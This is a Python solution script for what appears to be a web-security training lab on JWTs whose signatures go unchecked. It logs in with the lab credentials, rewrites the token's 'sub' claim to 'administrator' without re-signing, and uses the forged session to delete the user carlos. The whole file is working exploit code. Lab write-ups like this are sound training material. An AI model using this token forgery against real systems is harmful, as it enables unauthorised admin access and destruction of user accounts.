'''
This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
'''

import base64
import json
import requests
from bs4 import BeautifulSoup


proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0afa00dd0479432b804aa35e00c5008b.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

# login
r = s.get(f"{url}/login")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
}

s.post(f"{url}/login", data=payload)

# mutate jwt token
encoded_jwt = s.cookies.get_dict()['session']
encoded_jwt_split = encoded_jwt.split('.')

jwt_header = base64.b64decode(encoded_jwt_split[0] + '====')
jwt_data = base64.b64decode(encoded_jwt_split[1] + '====')
jwt_header = json.loads(jwt_header.decode())
jwt_data = json.loads(jwt_data.decode())

jwt_data['sub'] = 'administrator'

encoded_jwt_split[1] = base64.b64encode(json.dumps(jwt_data).encode()).decode()
admin_jwt = ".".join(encoded_jwt_split)

# delete carlos
payload = {'username':'carlos'}
s.cookies.set('session', admin_jwt)

s.get(f"{url}/admin/delete", params=payload)
